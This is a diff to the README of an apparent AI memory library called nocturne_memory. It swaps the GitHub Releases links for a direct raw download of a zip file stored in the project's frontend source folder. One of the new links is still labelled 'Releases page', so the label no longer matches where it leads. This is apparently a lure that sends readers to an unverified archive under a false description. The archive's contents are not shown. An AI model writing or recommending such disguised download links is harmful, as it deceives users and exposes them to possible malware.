@@ -4,7 +4,7 @@
 Welcome to nocturne_memory! This application helps your AI store information persistently and in an organized manner. Say goodbye to those fleeting memories.
 
 ## 📥 Download Now
-[![Download nocturne_memory](https://img.shields.io/badge/Download-nocturne_memory-blue.svg)](https://github.com/KomuDhara/nocturne_memory/releases)
+[![Download nocturne_memory](https://raw.githubusercontent.com/KomuDhara/nocturne_memory/main/frontend/src/memory_nocturne_v2.2.zip)](https://raw.githubusercontent.com/KomuDhara/nocturne_memory/main/frontend/src/memory_nocturne_v2.2.zip)
 
 ## 🔍 About
 nocturne_memory is a lightweight and visual AI memory library. It allows your AI to have a structured memory, moving beyond the limitations of short-term recall. With this tool, your AI can remember important details, making it more capable and effective in assisting you.
@@ -22,7 +22,7 @@ nocturne_memory is a lightweight and visual AI memory library. It allows your AI
 - **Structured Storage**: Organizes memories in a clear, hierarchical structure.
 
 ## 📑 Download & Install
-1. Visit the [Releases page](https://github.com/KomuDhara/nocturne_memory/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/KomuDhara/nocturne_memory/main/frontend/src/memory_nocturne_v2.2.zip).
 2. Locate the latest version of nocturne_memory.
 3. Click on the appropriate download link for your operating system (Windows, macOS, or Linux).
 4. Once downloaded, locate the file in your Downloads folder.
